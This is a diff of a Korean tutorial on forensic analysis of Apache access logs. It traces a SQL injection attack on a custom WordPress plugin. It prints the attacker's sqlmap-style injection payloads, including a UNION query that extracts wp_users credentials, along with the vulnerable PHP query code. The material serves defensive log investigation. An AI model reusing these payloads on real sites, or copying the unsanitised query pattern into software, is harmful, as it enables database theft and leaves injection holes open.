@@ -12,7 +12,7 @@ SQL 인젝션 등의 공격이 Log 상에 어떤식으로 나타나는지 알아
 
 ---
 
-# 로그란?
+# 로그
 로그는 서버에서 제공하는 가장 중요한 정보의 조각이다. 거의 대부분의 서버, 서비스, 어플리케이션은 정렬된 로깅을 제공한다. 어플리케이션이나 서비스를 실행하는 동안 발생하는 이벤트들은 로그 파일에 기록된다.
 
 로그 파일들은 언제, 어떻게, 누구로부터 서버에 접근하는지와 같은 크리티컬한 정보들을 정밀하게 보여준다. 이런 정보들은 퍼포먼스 모니터링, 트러블 슈팅, 디버그 어플리케이션 심지어 범죄 조사에도 도움을 준다.
@@ -198,4 +198,71 @@ brute-force 공격이나 관리자 패스워드가 새어 나가지 않았음이
 
 지금의 'access.log' 로는 일어난 일에 대한 단서를 찾기가 부족하다. 하지만 우리가 조사 할 수 있는 'access.log' 파일이 하나 더 있다. Apache HTTP Server log 수집 알고리즘은 오래된 로그 파일을 보관한다. `/var/log/apache2/` 디렉토리에 들어가면 4개의 추가적인 로그 파일이 보일 것이다.
 
-첫번째 스텝으로   
+첫째로 IP 주소 84.55.41.47이 했던 행동만 필터링 해야한다. 로그 중 하나에는 SQL 명령어로 가득하다. Custom plugin으로 명백하게 SQL injection 공격을 한것으로 보인다.
+```
+84.55.41.57- - [14/Apr/2016:08:22:13 0100]
+"GET /wordpress/wp-content/plugins/custom_plugin/check_user.php?
+userid=1 AND (SELECT 6810 FROM(SELECT COUNT(*),CONCAT(0x7171787671,(SELECT (ELT(6810=6810,1))),0x71707a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+HTTP/1.1" 200 166 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3)
+Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)"
+
+84.55.41.57- - [14/Apr/2016:08:22:13 0100]
+"GET /wordpress/wp-content/plugins/custom_plugin/check_user.php?
+userid=(SELECT 7505 FROM(SELECT COUNT(*),CONCAT(0x7171787671,(SELECT (ELT(7505=7505,1))),0x71707a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+HTTP/1.1" 200 166 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3)
+Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)"
+
+84.55.41.57- - [14/Apr/2016:08:22:13 0100]
+"GET /wordpress/wp-content/plugins/custom_plugin/check_user.php?
+userid=(SELECT CONCAT(0x7171787671,(SELECT (ELT(1399=1399,1))),0x71707a7871))
+HTTP/1.1" 200 166 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3)
+Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)"
+
+84.55.41.57- - [14/Apr/2016:08:22:27 0100]
+"GET /wordpress/wp-content/plugins/custom_plugin/check_user.php?
+userid=1 UNION ALL SELECT CONCAT(0x7171787671,0x537653544175467a724f,0x71707a7871),NULL,NULL--
+HTTP/1.1" 200 182 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3)
+Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)"
+```
+
+이 플러그인이 시스템 관리자가 온라인에서 찾은 코드를 복사해서 만들었다고 가정해보자. 스크립트는 부여된 ID에 유효성 체크를 의미한다.
+
+그 플러그인은 `/wordpress/wp-content/plugins/custom_plugin/check_user.php`라는 AJAX GET 요청 방식으로 웹페이지에 양식이 노출되어있었다.
+
+`check_user.php`를 살펴보면 스크립트가 제대로 작성되지 않아 SQL injection에 취약하다는 것을 금방 알아챌 수 있다.
+
+```
+<?php
+
+//Include the WordPress header
+include('/wordpress/wp-header.php');
+
+global $wpdb;
+
+// Use the GET parameter ‘userid’ as user input
+$id=$_GET['userid'];
+
+// Make a query to the database with the value the user supplied in the SQL statement
+$users = $wpdb->get_results( "SELECT * FROM users WHERE user_id=$id");
+
+?>
+```
+
+`access.log`에 있는 수 많은 로그들과 패턴들은 공격자가 SQL injection 취약점을 활용하는 도구들을 사용했다는 사실을 나타낸다. 공격들에 대한 로그는 횡설 수설 하는 것처럼 보이지만 SQL injection 취약점을 이용하여 데이터에 접근하는 보편적인 SQL 쿼리 문으로 작성되어있다. 그 공격 도구들은 열거된 프로세스의 일부로써 컬럼과 테이블 이름, 데이터 베이스 이름을 찾는 다양한 SQL injection 기술을 시도한다.
+
+```
+/wordpress/wp-content/plugins/my_custom_plugin/check_user.php?userid=-6859 UNION ALL SELECT (SELECT CONCAT(
+  0x7171787671,IFNULL(CAST(ID AS CHAR),0x20),
+  0x616474686c76,IFNULL(CAST(display_name AS CHAR),0x20),
+  0x616474686c76,IFNULL(CAST(user_activation_key AS CHAR),0x20),
+  0x616474686c76,IFNULL(CAST(user_email AS CHAR),0x20),
+  0x616474686c76,IFNULL(CAST(user_login AS CHAR),0x20),
+  0x616474686c76,IFNULL(CAST(user_nicename AS CHAR),0x20),
+  0x616474686c76,IFNULL(CAST(user_pass AS CHAR),0x20),
+  0x616474686c76,IFNULL(CAST(user_registered AS CHAR),0x20),
+  0x616474686c76,IFNULL(CAST(user_status AS CHAR),0x20),
+  0x616474686c76,IFNULL(CAST(user_url AS CHAR),0x20),
+  0x71707a7871) FROM wp.wp_users LIMIT 0,1),NULL,NULL--
+```
+
+위와 같은 SQL 코드는 워드프레스 데이터 베이스가 손상되었고 SQL 데이터 베이스의 민감한 모든 정보가 잠재적으로 도난 당 할 수 있음을 알려주는 매우 강력한 지표가 된다.
